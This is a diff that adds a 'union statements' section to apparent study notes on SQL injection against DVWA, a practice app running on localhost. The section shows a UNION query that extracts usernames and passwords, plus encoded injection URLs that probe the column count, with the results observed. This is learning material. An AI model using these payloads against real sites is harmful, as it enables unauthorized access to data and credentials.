@@ -69,4 +69,19 @@
 -----
 
 
-####
+#### union statements
+
+*web app*
+
+```SELECT first_name, last_name FROM users UNION SELECT username, password FROM login;```
+
+*attack: http://localhost:81/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%3B--*
+
+```User ID: 1’ UNION SELECT 1;- -``` *no data different number of columns*
+
+*attack: http://localhost:81/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1,2%3B--*
+
+```User ID: 1’ UNION SELECT 1,2;- -``` *returns data (number of columns match)*
+
+-----
+
